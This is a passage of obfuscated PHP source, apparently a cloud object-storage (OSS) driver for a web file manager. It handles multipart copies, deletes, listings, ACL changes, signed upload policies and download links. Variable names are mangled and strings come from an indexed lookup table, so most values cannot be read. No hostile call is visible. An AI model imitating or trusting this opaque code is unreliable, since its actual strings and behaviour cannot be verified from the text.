$âÒÆ¹¼„ = $ŠÙ¹ÃÇ· + (int) $Ÿë“¡Õœ[$»ç¸Í‡Ô[1501]]; $¤Š•’Ö¯ = (int) $Ÿë“¡Õœ[$»ç¸Í‡Ô[415]] + $âÒÆ¹¼„ - 1; $ıˆüë = array($»ç¸Í‡Ô[167] => $âÒÆ¹¼„, $»ç¸Í‡Ô[168] => $¤Š•’Ö¯); $ÎöºÙóú[] = $this->client->uploadPartCopy($this->bucket, $½‚ğ‡Ù, $this->bucket, $this->pathEncode($ËîâßÕŠ), $êŸğÆÃä, $àÄÛıêš, $ıˆüë); $êŸğÆÃä = $êŸğÆÃä + 1; } $ Äòëà› = array(); foreach ($ÎöºÙóú as $±Í•¿í’ => $µíÉÓÍ®) { $ Äòëà›[] = array($»ç¸Í‡Ô[300] => $±Í•¿í’ + 1, $»ç¸Í‡Ô[301] => $µíÉÓÍ®); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ËîâßÕŠ), $àÄÛıêš, $ Äòëà›); } catch (OSS\Core\OssException $û˜Å•Î¾) { $this->writeLog(__FUNCTION__ . $»ç¸Í‡Ô[215] . $û˜Å•Î¾->getMessage()); return !1; } return !0; } public function moveFile($£µŞ±£, $«æƒ•ó) { if ($this->copyFile($£µŞ±£, $«æƒ•ó)) { $this->remove($£µŞ±£); return $this->getPathOuter($«æƒ•ó); } return !1; } public function delFile($‚ü©Ã§Ê) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($‚ü©Ã§Ê)); } catch (OSS\Core\OssException $™²™‹ƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][215] . $™²™‹ƒ->getMessage()); return !1; } return !0; } public function delFolder($Åš©ºû³) { $ß¼ÀˆºŠ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->exist($Åš©ºû³)) { return !0; } $this->listItemCache = !1; $å²ÒÇ¼Á = $this->fileList($Åš©ºû³); $this->listItemCache = !0; $şÍìøíà = trim($Åš©ºû³, $ß¼ÀˆºŠ[8]) . $ß¼ÀˆºŠ[8]; if (!empty($Åš©ºû³) && $Åš©ºû³ !== $ß¼ÀˆºŠ[231] && !in_array($şÍìøíà, $å²ÒÇ¼Á[$ß¼ÀˆºŠ[85]])) { $å²ÒÇ¼Á[$ß¼ÀˆºŠ[85]][] = $şÍìøíà; } $…´½®ªó = $this->delByBatch($å²ÒÇ¼Á[$ß¼ÀˆºŠ[86]]); if (!$…´½®ªó) { return !1; } $…´½®ªó = $this->delByBatch($å²ÒÇ¼Á[$ß¼ÀˆºŠ[85]]); if (!$…´½®ªó) { return !1; } return $this->delFile($şÍìøíà); } private function delByBatch($ÃËúß¯) { foreach (array_chunk($ÃËúß¯, 1000) as $·ŒŒß·) { try { $this->client->deleteObjects($this->bucket, $·ŒŒß·); } catch (OSS\Core\OssException $¾Õ¤ÇÒ§) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][215] . $¾Õ¤ÇÒ§->getMessage()); return !1; } } return !0; } public function rename($­˜ˆ†„, $ÍäÅ­üï) { return $this->renameObject($­˜ˆ†„, $ÍäÅ­üï); } private function fileInfo($ùÕæÃé, $…­œ—¹ = false, $¾à²èÚ• = array()) { $ÓìÊ· =& $_SERVER[¼¥ÊĞÙÌ]; $÷ûÖ’¼Ú = array($ÓìÊ·[32] => $this->pathThis($ùÕæÃé), $ÓìÊ·[87] => $this->getPathOuter($ùÕæÃé), $ÓìÊ·[33] => $ÓìÊ·[233], $ÓìÊ·[79] => isset($¾à²èÚ•[$ÓìÊ·[79]]) ? $¾à²èÚ•[$ÓìÊ·[79]] : 0, $ÓìÊ·[169] => $this->ext($ùÕæÃé)); if ($…­œ—¹) { return $÷ûÖ’¼Ú; } $÷ûÖ’¼Ú[$ÓìÊ·[234]] = $÷ûÖ’¼Ú[$ÓìÊ·[88]] = 0; $÷ûÖ’¼Ú[$ÓìÊ·[235]] = $÷ûÖ’¼Ú[$ÓìÊ·[236]] = !0; if (empty($¾à²èÚ•)) { $ĞÑâµ‰ = $this->objectMeta($ùÕæÃé); if (!$ĞÑâµ‰) { return $÷ûÖ’¼Ú; } $¾à²èÚ• = array($ÓìÊ·[88] => strtotime($ĞÑâµ‰[$ÓìÊ·[1499]]), $ÓìÊ·[79] => $ĞÑâµ‰[$ÓìÊ·[1498]] + 0, $ÓìÊ·[1497] => $ĞÑâµ‰[$ÓìÊ·[1497]]); } if (isset($¾à²èÚ•[$ÓìÊ·[1497]]) && $¾à²èÚ•[$ÓìÊ·[1497]]) { $÷ûÖ’¼Ú[$ÓìÊ·[238]] = trim($¾à²èÚ•[$ÓìÊ·[1497]], $ÓìÊ·[121]); } if (isset($¾à²èÚ•[$ÓìÊ·[79]])) { $÷ûÖ’¼Ú[$ÓìÊ·[79]] = $¾à²èÚ•[$ÓìÊ·[79]]; } if (isset($¾à²èÚ•[$ÓìÊ·[88]])) { $÷ûÖ’¼Ú[$ÓìÊ·[88]] = $¾à²èÚ•[$ÓìÊ·[88]]; } if (isset($¾à²èÚ•[$ÓìÊ·[207]]) && !trim($÷ûÖ’¼Ú[$ÓìÊ·[88]])) { $÷ûÖ’¼Ú[$ÓìÊ·[88]] = $¾à²èÚ•[$ÓìÊ·[207]]; } return $÷ûÖ’¼Ú; } private function folderInfo($¾Ù…õß¢, $Ç®¹¢„Ñ = false, $ß‘‘šŞî = array()) { $‘Öö© =& $_SERVER[¼¥ÊĞÙÌ]; $½­Ç‰¡÷ = array($‘Öö©[32] => $this->pathThis($¾Ù…õß¢), $‘Öö©[87] => $this->getPathOuter($‘Öö©[8] . $¾Ù…õß¢), $‘Öö©[33] => $‘Öö©[78]); if ($Ç®¹¢„Ñ) { return $½­Ç‰¡÷; } $½­Ç‰¡÷[$‘Öö©[234]] = $½­Ç‰¡÷[$‘Öö©[88]] = 0; $½­Ç‰¡÷[$‘Öö©[235]] = $½­Ç‰¡÷[$‘Öö©[236]] = !0; if (empty($ß‘‘šŞî)) { $¾Ù…õß¢ = rtrim($¾Ù…õß¢, $‘Öö©[8]) . $‘Öö©[8]; $Íú Ù‘‚ = $this->objectMeta($¾Ù…õß¢); if (!$Íú Ù‘‚) { return $½­Ç‰¡÷; } $ß‘‘šŞî = array($‘Öö©[234] => $Íú Ù‘‚[$‘Öö©[580]][$‘Öö©[1502]], $‘Öö©[88] => strtotime($Íú Ù‘‚[$‘Öö©[1499]])); } if (isset($ß‘‘šŞî[$‘Öö©[88]])) { $½­Ç‰¡÷[$‘Öö©[88]] = $ß‘‘šŞî[$‘Öö©[88]]; } if (isset($ß‘‘šŞî[$‘Öö©[234]])) { $½­Ç‰¡÷[$‘Öö©[234]] = $ß‘‘šŞî[$‘Öö©[234]]; } return $½­Ç‰¡÷; } public function listPath($ÃÃÑÏ¤§, $®¡Òì°Á = false) { $Î® „§‰ =& $_SERVER[¼¥ÊĞÙÌ]; $¶†×§úš = $this->fileList($ÃÃÑÏ¤§, $Î® „§‰[8], !0); foreach ($¶†×§úš[$Î® „§‰[85]] as $É•Šµ›¡ => $…×¶‘¡×) { $¶†×§úš[$Î® „§‰[85]][$É•Šµ›¡] = $this->folderInfo($…×¶‘¡×, $®¡Òì°Á, $…×¶‘¡×); } foreach ($¶†×§úš[$Î® „§‰[86]] as $É•Šµ›¡ => $…×¶‘¡×) { $¶†×§úš[$Î® „§‰[86]][$É•Šµ›¡] = $this->fileInfo($…×¶‘¡×[$Î® „§‰[32]], $®¡Òì°Á, $…×¶‘¡×); } return $¶†×§úš; } protected function infoChildren($µîÛ¬ğü, &$á’†Ö¥ì) { $õ½¶™­Š =& $_SERVER[¼¥ÊĞÙÌ]; $ªˆ—ĞÕ = $this->fileList($µîÛ¬ğü, $õ½¶™­Š[12], !0); $á’†Ö¥ì[$õ½¶™­Š[81]] += count($ªˆ—ĞÕ[$õ½¶™­Š[85]]); $á’†Ö¥ì[$õ½¶™­Š[80]] += count($ªˆ—ĞÕ[$õ½¶™­Š[86]]); foreach ($ªˆ—ĞÕ[$õ½¶™­Š[86]] as $Ï£ÓÔÚÄ) { if (!$Ï£ÓÔÚÄ || !$Ï£ÓÔÚÄ[$õ½¶™­Š[79]]) { continue; } $á’†Ö¥ì[$õ½¶™­Š[79]] += $Ï£ÓÔÚÄ[$õ½¶™­Š[79]]; } } public function has($ÖÌšÊı–, $È½Şëı› = false, $Ëë‹óÇ = true) { $…Ÿ¢çã =& $_SERVER[¼¥ÊĞÙÌ]; $ÖÌšÊı– = trim($ÖÌšÊı–, $…Ÿ¢çã[8]); $øÑ”ØÄ = empty($ÖÌšÊı–) && $ÖÌšÊı– !== $…Ÿ¢çã[231] ? $…Ÿ¢çã[12] : $ÖÌšÊı– . $…Ÿ¢çã[8]; $«ÙûÛÏŸ = $…Ÿ¢çã[12]; $ëÑœö¢Ó = 500; $û´Ãø‹ = $«Üº‰Å­ = 0; while (!0) { check_abort(); $ˆ‰¯¿â = array($…Ÿ¢çã[1493] => $…Ÿ¢çã[8], $…Ÿ¢çã[1494] => $øÑ”ØÄ, $…Ÿ¢çã[1495] => $ëÑœö¢Ó, $…Ÿ¢çã[1496] => $«ÙûÛÏŸ); try { $øæì¦Ğ = $this->client->listObjects($this->bucket, $ˆ‰¯¿â); } catch (OSS\Core\OssException $´ã£âõ) { $this->writeLog(__FUNCTION__ . $…Ÿ¢çã[215] . $´ã£âõ->getMessage()); break; } $«ÙûÛÏŸ = $øæì¦Ğ->getNextMarker(); $ªøÄ›éÙ = $øæì¦Ğ->getObjectList(); $¯´äøß´ = $øæì¦Ğ->getPrefixList(); if ($È½Şëı›) { if (count($ªøÄ›éÙ) > 1 || count($ªøÄ›éÙ) == 1 && $ªøÄ›éÙ[0]->getKey() != $øÑ”ØÄ) { $û´Ãø‹ += count($ªøÄ›éÙ) - 1; } if (!empty($¯´äøß´)) { $«Üº‰Å­ += count($¯´äøß´); } if ($«ÙûÛÏŸ === $…Ÿ¢çã[12]) { break; } continue; } if ($Ëë‹óÇ) { if (!empty($ªøÄ›éÙ)) { if (count($ªøÄ›éÙ) > 1 || $ªøÄ›éÙ[0]->getKey() != $øÑ”ØÄ) { return !0; } } } else { if (!empty($¯´äøß´)) { return !0; } } if ($«ÙûÛÏŸ === $…Ÿ¢çã[12]) { break; } } if ($È½Şëı›) { return array($…Ÿ¢çã[242] => $û´Ãø‹, $…Ÿ¢çã[243] => $«Üº‰Å­); } return !1; } public function listAll($Æš³±èœ) { $œ–àªš† =& $_SERVER[¼¥ÊĞÙÌ]; $€ÃåÃÔ› = $this->fileList($Æš³±èœ, $œ–àªš†[12], !0); $–½Ä—€÷ = array_to_keyvalue($€ÃåÃÔ›[$œ–àªš†[86]], $œ–àªš†[32]); foreach ($€ÃåÃÔ›[$œ–àªš†[85]] as $àÉ¶Œºˆ) { if (is_string($àÉ¶Œºˆ)) { $–½Ä—€÷[$àÉ¶Œºˆ] = array($œ–àªš†[79] => 0); } } return $this->listAllFiles($Æš³±èœ, $–½Ä—€÷); } public function canRead($“ ©ğÉÁ) { $ò¿îĞ—ã =& $_SERVER[¼¥ÊĞÙÌ]; $Î€Ò’´² = $this->pathAcl($“ ©ğÉÁ); return $Î€Ò’´² == $ò¿îĞ—ã[1503] || $Î€Ò’´² == $ò¿îĞ—ã[627] ? !0 : !1; } public function canWrite($ş¤ê©Ò½) { $íĞŒÌ•¤ = $this->pathAcl($ş¤ê©Ò½); return $íĞŒÌ•¤ == $_SERVER[¼¥ÊĞÙÌ][627] ? !0 : !1; } public function pathAcl($±ÊÔÑµ) { $åÊ…¸¦ã =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Ë˜‹ë¡ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($±ÊÔÑµ)); } catch (OSS\Core\OssException $Œ‚ÚÈÀ) { $this->writeLog(__FUNCTION__ . $åÊ…¸¦ã[215] . $Œ‚ÚÈÀ->getMessage()); return !1; } $Øñª«Úì = $Ë˜‹ë¡ == $åÊ…¸¦ã[37] ? $this->bucketAcl : $Ë˜‹ë¡; if ($Øñª«Úì == $åÊ…¸¦ã[1504]) { return $åÊ…¸¦ã[1503]; } if ($Øñª«Úì == $åÊ…¸¦ã[1505]) { return $åÊ…¸¦ã[627]; } return $Øñª«Úì; } private function chmodPath($æ¥Õ™Ó£, $¿ĞØ ‰÷ = '') { $³„µÎÂú =& $_SERVER[¼¥ÊĞÙÌ]; $ÈÑÎ«Òª = empty($¿ĞØ ‰÷) ? $³„µÎÂú[1505] : $¿ĞØ ‰÷; $ûó¨ÅÇ¨ = array($³„µÎÂú[37], $³„µÎÂú[232], $³„µÎÂú[1504], $³„µÎÂú[1505]); if (!in_array($ÈÑÎ«Òª, $ûó¨ÅÇ¨)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($æ¥Õ™Ó£), $ÈÑÎ«Òª); } catch (OSS\Core\OssException $Ë¿€¥â¢) { $this->writeLog(__FUNCTION__ . $³„µÎÂú[215] . $Ë¿€¥â¢->getMessage()); return !1; } return !0; } public function getContent($òêÚšª²) { return $this->fileSubstr($òêÚšª², -1); } public function setContent($ÂèØùş¢, $´ôºÀ„ = '') { $ãéû¡ =& $_SERVER[¼¥ÊĞÙÌ]; try { $ªõšÎÎ = $this->trafficLimit($ãéû¡[1506]); $±üàà÷„ = $this->client->putObject($this->bucket, $this->pathEncode($ÂèØùş¢), $´ôºÀ„, $ªõšÎÎ); } catch (OSS\Core\OssException $éèßì‘›) { $this->writeLog(__FUNCTION__ . $ãéû¡[215] . $éèßì‘›->getMessage()); return !1; } $ÈÆ¿ÔÎ = array($ãéû¡[1500] => trim($±üàà÷„[$ãéû¡[1497]], $ãéû¡[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÂèØùş¢))); $this->updateObjMeta($ÂèØùş¢, $ÈÆ¿ÔÎ); return isset($±üàà÷„[$ãéû¡[1507]][$ãéû¡[297]]) ? !0 : !1; } private function updateObjMeta($ÖÎœ¹ªñ, $ÀîÊ½¶İ) { $ÖÎœ¹ªñ = $this->pathEncode($ÖÎœ¹ªñ); try { $›Áæ½çí = array(OSS\OssClient::OSS_HEADERS => $ÀîÊ½¶İ); $this->client->copyObject($this->bucket, $ÖÎœ¹ªñ, $this->bucket, $ÖÎœ¹ªñ, $›Áæ½çí); } catch (OSS\Core\OssException $÷åáöÌ¦) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][215] . $÷åáöÌ¦->getMessage()); return !1; } return !0; } public function upload($Èˆëêœ½, $õÎòğ‘ú, $î•îØ¦Û = false, $Ñğ„ŸùÃ = REPEAT_REPLACE) { $ìŠªû =& $_SERVER[¼¥ÊĞÙÌ]; $ÖÙƒáõß = trim($Èˆëêœ½, $ìŠªû[8]); $É£Ù­ùş = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ìŠªû[1500] => @md5_file($õÎòğ‘ú)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Èˆëêœ½))); $É£Ù­ùş = $this->trafficLimit($ìŠªû[1506], $É£Ù­ùş); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÖÙƒáõß), $õÎòğ‘ú, $É£Ù­ùş); } catch (OSS\Core\OssException $©÷èéä†) { $this->writeLog(__FUNCTION__ . $ìŠªû[215] . $©÷èéä†->getMessage()); return !1; } return $this->getPathOuter($Èˆëêœ½); } public function getHost() { $ÆôşÕæ® =& $_SERVER[¼¥ÊĞÙÌ]; $¬ô„Õ‡ = explode($ÆôşÕæ®[211], parent::getHost()); return $¬ô„Õ‡[0] . $ÆôşÕæ®[211] . $this->bucket . $ÆôşÕæ®[10] . $¬ô„Õ‡[1]; } public function uploadFormData($ù¢ôŸ†›, $ô…ª ñ = 3600) { $’ÃÊó =& $_SERVER[¼¥ÊĞÙÌ]; if (!($¨¦Äİ¯ä = $this->getHost())) { return !1; } $÷ÓÖÆŒ¨ = $ô…ª ñ; $ š†‹  = date($’ÃÊó[1508], time() + $÷ÓÖÆŒ¨); $Û—Şµä· = new DateTime($ š†‹ ); $³¡ĞóÎÛ = $Û—Şµä·->format(DateTime::ISO8601); $¿Íø¯Õ¯ = strpos($³¡ĞóÎÛ, $’ÃÊó[374]); $³¡ĞóÎÛ = substr($³¡ĞóÎÛ, 0, $¿Íø¯Õ¯) . $’ÃÊó[1509]; $‚‰˜· = 1048576000 * 5; $çßÔ‹‘¡ = $this->pathFather($ù¢ôŸ†›); $ç«ĞÍù² = array($’ÃÊó[265] => $³¡ĞóÎÛ, $’ÃÊó[268] => array(array($’ÃÊó[1510], 0, $‚‰˜·), array($’ÃÊó[270], $’ÃÊó[271], $çßÔ‹‘¡))); $¨¼ÖÃ±« = base64_encode(json_encode($ç«ĞÍù²)); $´ÉĞ×ßã = base64_encode(hash_hmac($’ÃÊó[1431], $¨¼ÖÃ±«, $this->secret, !0)); $™‰ú¾µ = array($’ÃÊó[1511] => $this->accessKey, $’ÃÊó[280] => $¨¼ÖÃ±«, $’ÃÊó[273] => $’ÃÊó[264], $’ÃÊó[1512] => $´ÉĞ×ßã, $’ÃÊó[209] => $¨¦Äİ¯ä); $™‰ú¾µ = $this->trafficLimit($’ÃÊó[1506], $™‰ú¾µ, !0); return $™‰ú¾µ; } public function uploadMultiData($üî£´šß, $ı¯·Éš© = 3600) { $¥©™˜§« =& $_SERVER[¼¥ÊĞÙÌ]; if (!($÷šØÄÌ¹ = $this->getHost())) { return !1; } $‚şçÈ° = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($üî£´šß)); return array($¥©™˜§«[284] => $‚şçÈ°, $¥©™˜§«[209] => $÷šØÄÌ¹ . $¥©™˜§«[8] . $this->pathEncode($üî£´šß), $¥©™˜§«[285] => gmdate($¥©™˜§«[1513]), $¥©™˜§«[97] => $üî£´šß); } public function uploadMultiAuth($ÉÊØ”ö, $Ù³ÊÁûì = array()) { if (isset($Ù³ÊÁûì[$_SERVER[¼¥ÊĞÙÌ][286]])) { return $this->uploadPartAuth($ÉÊØ”ö, $Ù³ÊÁûì); } return $this->uploadListAuth($ÉÊØ”ö, $Ù³ÊÁûì); } private function uploadPartAuth($„ğÂŞÔÆ, $êéÕŞ™ = array()) { $®¦×œù =& $_SERVER[¼¥ÊĞÙÌ]; $ºñˆÆĞ¨ = $êéÕŞ™[$®¦×œù[97]]; $Ò”úç¸Ü = $this->_getUploadAuth($ºñˆÆĞ¨, $êéÕŞ™); $Ô§óËßÍ = array($®¦×œù[289] => $Ò”úç¸Ü[$®¦×œù[289]], $®¦×œù[285] => $Ò”úç¸Ü[$®¦×œù[285]]); if (isset($Ò”úç¸Ü[$®¦×œù[1514]])) { $Ô§óËßÍ[$®¦×œù[1514]] = $Ò”úç¸Ü[$®¦×œù[1514]]; } return $Ô§óËßÍ; } private function uploadListAuth($úÎª‘ˆ, $©¥Æ­ó­ = array()) { $·ÓåËÛŠ =& $_SERVER[¼¥ÊĞÙÌ]; $Â½ÈÙƒ¾ = $©¥Æ­ó­[$·ÓåËÛŠ[97]]; $¤òåèÃŸ = $©¥Æ­ó­[$·ÓåËÛŠ[284]]; $ƒ»•¬™ = $this->client->listParts($this->bucket, $this->pathEncode($Â½ÈÙƒ¾), $¤òåèÃŸ); $îÛŸ„ú = $ƒ»•¬™->getListPart(); $¾åóóïÅ = array(); foreach ($îÛŸ„ú as $òÂà’¥Ô) { $¾åóóïÅ[] = array($·ÓåËÛŠ[300] => $òÂà’¥Ô->getPartNumber(), $·ÓåËÛŠ[301] => trim($òÂà’¥Ô->getETag(), $·ÓåËÛŠ[121])); } if (!$¾åóóïÅ) { return !1; } $Ü¬Òûùñ = $this->_getUploadAuth($Â½ÈÙƒ¾, $©¥Æ­ó­); return array($·ÓåËÛŠ[289] => $Ü¬Òûùñ[$·ÓåËÛŠ[289]], $·ÓåËÛŠ[285] => $Ü¬Òûùñ[$·ÓåËÛŠ[285]], $·ÓåËÛŠ[292] => $¾åóóïÅ); } private function _getUploadAuth($Œ²ï›û, $›àºû¿³) { $‰›ˆè— =& $_SERVER[¼¥ÊĞÙÌ]; $ñìõ‘ò– = gmdate($‰›ˆè—[1513]); $ü¦§ÑÓ = isset($›àºû¿³[$‰›ˆè—[286]]) ? $‰›ˆè—[256] : $‰›ˆè—[291]; $®Øé™¬ = array_intersect_key($›àºû¿³, array_flip(array($‰›ˆè—[286], $‰›ˆè—[284]))); ksort($®Øé™¬); $’ßÕôœ = $®Øé™¬ ? $‰›ˆè—[76] . http_build_query($®Øé™¬, null, $‰›ˆè—[287], PHP_QUERY_RFC3986) : $‰›ˆè—[12]; $–®™ª§¥ = array($ü¦§ÑÓ, $‰›ˆè—[12], $‰›ˆè—[123], $ñìõ‘ò–, "\170\55\x6f\x73\x73\55\144\141\164\x65\72{$ñìõ‘ò–}", $‰›ˆè—[8] . $this->bucket . $‰›ˆè—[8] . $Œ²ï›û . $’ßÕôœ); if (isset($›àºû¿³[$‰›ˆè—[286]])) { $ö©Üö®’ = $this->trafficLimit($‰›ˆè—[1506], array(), !0); if ($ö©Üö®’) { $Œ²ï›û = $‰›ˆè—[1514]; array_splice($–®™ª§¥, 5, 0, $Œ²ï›û . $‰›ˆè—[4] . $ö©Üö®’[$Œ²ï›û]); } } $ù£ää´ = implode($‰›ˆè—[288], $–®™ª§¥); $òğõ›õ¡ = base64_encode(hash_hmac($‰›ˆè—[1431], $ù£ää´, $this->secret, !0)); $¯¿Õ–  = $‰›ˆè—[1483] . $this->accessKey . $‰›ˆè—[4] . $òğõ›õ¡; $«…—“ı¢ = array($‰›ˆè—[289] => $¯¿Õ– , $‰›ˆè—[285] => $ñìõ‘ò–); if (!empty($ö©Üö®’)) { $«…—“ı¢ = array_merge($«…—“ı¢, $ö©Üö®’); } return $«…—“ı¢; } public function download($æ‡§½Õ›, $©•ßÙÎŞ) { $óÈÕ‚ù =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->isFolder($æ‡§½Õ›)) { return !1; } try { $ÏˆñÙæ¢ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $©•ßÙÎŞ); $ÏˆñÙæ¢ = $this->trafficLimit($óÈÕ‚ù[112], $ÏˆñÙæ¢); $this->client->getObject($this->bucket, $this->pathEncode($æ‡§½Õ›), $ÏˆñÙæ¢); } catch (OSS\Core\OssException $³Å½Ç«ı) { $this->writeLog(__FUNCTION__ . $óÈÕ‚ù[215] . $³Å½Ç«ı->getMessage()); return !1; } return $©•ßÙÎŞ; } public function fileSubstr($ˆ§Çª‰€, $Œêù·‹Ş = 0, $‘ã˜Ñ² = false) { if ($Œêù·‹Ş === -1) { $öÍÆ§ñ« = array(); } else { if ($‘ã˜Ñ² === !1) { $¨ù¸©‹£ = $this->size($ˆ§Çª‰€); } else { $¨ù¸©‹£ = $Œêù·‹Ş + $‘ã˜Ñ² - 1; } $öÍÆ§ñ« = array(OSS\OssClient::OSS_RANGE => "{$Œêù·‹Ş}\55{$¨ù¸©‹£}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ˆ§Çª‰€), $öÍÆ§ñ«); } catch (OSS\Core\OssException $¼Æ¨‰Ï‡) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][215] . $¼Æ¨‰Ï‡->getMessage()); think_exception($¼Æ¨‰Ï‡->getMessage()); return !1; } } private function trafficLimit($ÓÃÁµ½ã, $ıœÑ‘í¡ = array(), $¼½â‰‰Ò = false) { $Ğ¹ûØ‰ê =& $_SERVER[¼¥ÊĞÙÌ]; if ($ÓÃÁµ½ã == $Ğ¹ûØ‰ê[1506] && $this->isUploadServer() || $ÓÃÁµ½ã == $Ğ¹ûØ‰ê[112] && $this->isFileOutServer()) { return $ıœÑ‘í¡; } $ƒÔıŞÂ£ = floatval($GLOBALS[$Ğ¹ûØ‰ê[6]][$Ğ¹ûØ‰ê[92]][$Ğ¹ûØ‰ê[110]][$ÓÃÁµ½ã]) * 1024 * 1024 * 8; if (!$ƒÔıŞÂ£) { return $ıœÑ‘í¡; } $ƒÔıŞÂ£ = $ƒÔıŞÂ£ < 819200 ? 819200 : ($ƒÔıŞÂ£ > 838860800 ? 838860800 : $ƒÔıŞÂ£); if ($¼½â‰‰Ò) { $ıœÑ‘í¡[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ƒÔıŞÂ£); } else { if (!isset($ıœÑ‘í¡[OSS\OssClient::OSS_HEADERS])) { $ıœÑ‘í¡[OSS\OssClient::OSS_HEADERS] = array(); } $ıœÑ‘í¡[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ƒÔıŞÂ£); } return $ıœÑ‘í¡; } public function link($Ì©êš”Ö, $—°Û¦ = array()) { $µ«Š½“ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->exist($Ì©êš”Ö) || $this->isFolder($Ì©êš”Ö)) { return !1; } try { $—°Û¦ = $this->trafficLimit($µ«Š½“[112], $—°Û¦, !0); $©¥­Ñ¢ = $this->client->signUrl($this->bucket, $this->pathEncode($Ì©êš”Ö), 3600 * 12, $µ«Š½“[1515], $—°Û¦); return $this->getCdnLink($©¥­Ñ¢); } catch (OSS\Core\OssException $¯Ü¢æ®) { $this->writeLog(__FUNCTION__ . $µ«Š½“[215] . $¯Ü¢æ®->getMessage()); return !1; } } public function fileOut($ß¼¡°·†, $Š²ø“¥Š = false, $Õ—éµÖü = false, $Ã‘´©Ãù = '') { $†’ï¯£² =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ß¼¡°·†, $Š²ø“¥Š, $Õ—éµÖü, $Ã‘´©Ãù); } if (!$Õ—éµÖü) { $Õ—éµÖü = $this->pathThis($ß¼¡°·†); } $Õ—éµÖü = rawurlencode($Õ—éµÖü); $ÔÌÖ°¢º = get_file_mime(get_path_ext($Õ—éµÖü)); if ($ÔÌÖ°¢º == $†’ï¯£²[251]) { return parent::fileOut($ß¼¡°·†, $Š²ø“¥Š, $Õ—éµÖü, $Ã‘´©Ãù); } $Š²ø“¥Š = $Š²ø“¥Š ? $†’ï¯£²[1516] : $†’ï¯£²[1517]; $‹É·äÓ = array(OSS\OssClient::OSS_SUB_RESOURCE => $†’ï¯£²[1518] . rawurlencode("{$Š²ø“¥Š}\x3b\x66\x69\x6c\x65\156\141\155\145\x3d{$Õ—éµÖü}")); $Åƒä£áæ = $this->link($ß¼¡°·†, $‹É·äÓ); $this->fileOutLink($Åƒä£áæ); } public function fileOutServer($Öâ¹ß¹è, $ñşÁÈ¸µ = false, $æĞ˜îŠ = false, $¡ú¾™ = '') { parent::fileOut($Öâ¹ß¹è, $ñşÁÈ¸µ, $æĞ˜îŠ, $¡ú¾™); } public function fileOutImage($ôÓãüÜ¼, $Ä¾û¯Â = 250) { if ($this->size($ôÓãüÜ¼) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ôÓãüÜ¼, $Ä¾û¯Â); } $Áñ›»Ü¹ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¼¥ÊĞÙÌ][1480] . $Ä¾û¯Â); $ÏËßšôİ = $this->link($ôÓãüÜ¼, $Áñ›»Ü¹); $this->fileOutLink($ÏËßšôİ); } public function fileOutImageServer($šĞé÷¿–, $ Ä·ØÆ = 250) { parent::fileOutImage($šĞé÷¿–, $ Ä·ØÆ); } public function fileOutLink($ÄäØ€ìÆ) { $ÒÙµ‰ê =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->isCdnHost() && substr($ÄäØ€ìÆ, 0, 7) == $ÒÙµ‰ê[219]) { $ÄäØ€ìÆ = $ÒÙµ‰ê[220] . substr($ÄäØ€ìÆ, 7); } header($ÒÙµ‰ê[175] . $ÄäØ€ìÆ); die; } public function hashMd5($äÀü¨ÆÅ, $°» ëÈ¸ = '') { $ˆ”ä˜«Ò =& $_SERVER[¼¥ÊĞÙÌ]; $¾±ïÓ©ü = $this->_objectMeta($äÀü¨ÆÅ); if (!$¾±ïÓ©ü) { return $ˆ”ä˜«Ò[12]; } if (!isset($¾±ïÓ©ü[$ˆ”ä˜«Ò[1500]]) && !empty($°» ëÈ¸)) { $ÜèÀ¾Œı = $this->updateObjMeta($äÀü¨ÆÅ, array($ˆ”ä˜«Ò[1500] => $°» ëÈ¸)); $¾±ïÓ©ü[$ˆ”ä˜«Ò[1500]] = $ÜèÀ¾Œı ? $°» ëÈ¸ : $ˆ”ä˜«Ò[12]; } return isset($¾±ïÓ©ü[$ˆ”ä˜«Ò[1500]]) ? strtolower($¾±ïÓ©ü[$ˆ”ä˜«Ò[1500]]) : $ˆ”ä˜«Ò[12]; } public function size($Œıµà¦®) { $İßğœ¤¢ = $this->objectMeta($Œıµà¦®); return $İßğœ¤¢ ? $İßğœ¤¢[$_SERVER[¼¥ÊĞÙÌ][79]] : 0; } public function info($Û¬ †™²) { if ($this->isFolder($Û¬ †™²)) { return $this->folderInfo($Û¬ †™²); } else { if ($this->isFile($Û¬ †™²)) { return $this->fileInfo($Û¬ †™²); } } return !1; } public function exist($ñâş ±) { return $this->isFile($ñâş ±) || $this->isFolder($ñâş ±); } public function isFile($²¡±„à™) { return !$this->isFolder($²¡±„à™) && $this->objectMeta($²¡±„à™); } public function isFolder($¥Çş§İ) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][180], $¥Çş§İ); } protected function objectMeta($á¨æ×Èò) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][182], $á¨æ×Èò); } protected function 